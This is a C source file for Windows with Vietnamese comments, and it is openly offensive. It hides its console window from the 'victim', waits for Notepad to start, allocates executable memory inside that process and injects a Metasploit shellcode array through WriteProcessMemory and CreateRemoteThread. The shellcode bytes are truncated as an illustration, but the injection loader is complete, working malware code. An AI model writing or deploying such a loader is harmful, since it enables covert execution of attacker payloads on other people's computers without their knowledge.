#include <windows.h>
#include <tlhelp32.h>

// 1. DÁN MẢNG SHELLCODE MẪU CỦA METASPLOIT VÀO ĐÂY
unsigned char metasploit_shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\xff\xd5"; // Đoạn mã này đã được rút gọn minh họa

// Hàm tự động tìm PID của Notepad
DWORD GetTargetProcessId(const char* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, processName) == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    // Ẩn hoàn toàn cửa sổ đen CMD khi nạn nhân click chạy file
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    DWORD pid = 0;

    // Vòng lặp liên tục quét hệ thống chờ Notepad mở lên
    while (pid == 0) {
        pid = GetTargetProcessId("notepad.exe");
        if (pid == 0) {
            Sleep(2000); // Chờ 2 giây rồi quét lại
        }
    }

    // 2. Tiến hành găm trực tiếp Shellcode vào RAM của Notepad (Không cần file DLL)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess != NULL) {
        // Cấp phát vùng nhớ trống có quyền THỰC THI (PAGE_EXECUTE_READWRITE) ngay trong Notepad
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(metasploit_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (remoteMem != NULL) {
            // Bơm thẳng mảng byte Metasploit vào vùng nhớ đó
            WriteProcessMemory(hProcess, remoteMem, metasploit_shellcode, sizeof(metasploit_shellcode), NULL);
            
            // Tạo luồng từ xa để Notepad tự kích hoạt đoạn mã của Metasploit
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
            if (hThread != NULL) {
                CloseHandle(hThread);
            }
        }
        CloseHandle(hProcess);
    }
    return 0;
}
